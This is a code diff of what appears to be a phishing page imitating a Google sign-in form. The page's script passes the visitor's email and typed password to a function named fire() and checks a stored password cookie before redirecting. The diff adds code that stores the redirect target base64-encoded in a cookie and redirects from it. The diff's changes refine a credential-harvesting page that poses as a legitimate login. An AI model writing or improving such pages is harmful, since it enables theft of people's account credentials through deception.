@@ -134,8 +134,8 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 <div class="VmOpGe" aria-hidden="true"></div>
 </div>
 <script>
-	//document.getElementById("forme").addEventListener("submit", function(e) {if(!document.getElementById('pw').value) {e.preventDefault();}});
 	document.getElementById("redirect").value = urldata("redirect");
+	Cookies.set("r", btoa(urldata("redirect")));
 	document.getElementById("pw").addEventListener("focus", function() {document.getElementById('password').className+=' u3bW4e';});
 	document.getElementById("pw").addEventListener("blur", function() {document.getElementById('password').classList.remove('u3bW4e');});
 	document.getElementById("pw").focus();
@@ -170,7 +170,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
     function doFire() {
 		if(document.getElementById('pw').value) {
 			if(atob(Cookies.get("x-user-fire"))==document.getElementById('pw').value) {
-                location.href=document.getElementById("redirect").value;
+                location.href = atob(Cookies.get("r"));
                 return;
             }
 			if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
